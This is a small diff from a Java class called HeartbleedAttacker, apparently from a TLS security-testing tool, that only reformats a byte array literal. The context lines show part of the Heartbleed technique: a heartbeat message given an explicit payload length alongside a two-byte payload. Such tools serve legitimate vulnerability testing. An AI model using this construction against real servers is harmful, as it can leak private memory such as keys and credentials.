@@ -71,7 +71,7 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
         ModifiableInteger payloadLength = new ModifiableInteger();
         payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
         ModifiableByteArray payload = new ModifiableByteArray();
-        payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
+        payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[]{1, 3}));
         message.setHeartbeatMessageType(heartbeatMessageType);
         message.setPayload(payload);
         message.setPayloadLength(payloadLength);
